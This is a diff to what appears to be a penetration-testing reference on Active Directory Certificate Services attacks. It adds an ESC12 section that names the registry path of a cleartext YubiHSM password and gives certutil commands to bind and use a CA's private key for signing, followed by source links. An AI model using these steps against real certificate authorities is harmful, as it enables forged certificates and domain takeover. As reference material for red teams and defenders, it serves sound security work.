@@ -353,6 +353,24 @@ Exploitation:
     ```
 
 
+## ESC12 - ADCS CA on YubiHSM
+
+The ESC12 vulnerability occurs when a Certificate Authority (CA) stores its private key on a YubiHSM2 device, which requires an authentication key (password) to access. This password is stored in the registry in cleartext, allowing an attacker with shell access to the CA server to recover the private key. 
+
+Unlocking the YubiHSM with the plaintext password in the registry key: `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`.
+
+* Importing the CA certificate into the user store
+  ```ps1
+  certutil -addstore -user my <CA certificate file>
+  ```
+* Associated with the private key in the YubiHSM2 device
+  ```ps1
+  certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
+  ```
+* Finally use `certutil -sign ...`
+
+
+
 ## ESC13 - Issuance Policy
 
 > If a principal (user or computer) has enrollment rights on a certificate template configured with an issuance policy that has an OID group link, then this principal can enroll a certificate that allows obtaining access to the environment as a member of the group specified in the OID group link.
@@ -523,3 +541,5 @@ Using the **UnPAC The Hash** method, you can retrieve the NT Hash for an User vi
 * [From DA to EA with ESC5 - Andy Robbins - May 16, 2023](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c)
 * [ADCS ESC14 Abuse Technique - Jonas Bülow Knudsen - 02/01/2024](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9)
 * [ADCS Attack Paths in BloodHound — Part 2 - Jonas Bülow Knudsen - May 1, 2024](https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-2-ac7f925d1547)
+* [ESC12 – Shell access to ADCS CA with YubiHSM - hajo - October 2023](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
+* [AD CS Domain Escalation - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#shell-access-to-adcs-ca-with-yubihsm-esc12)
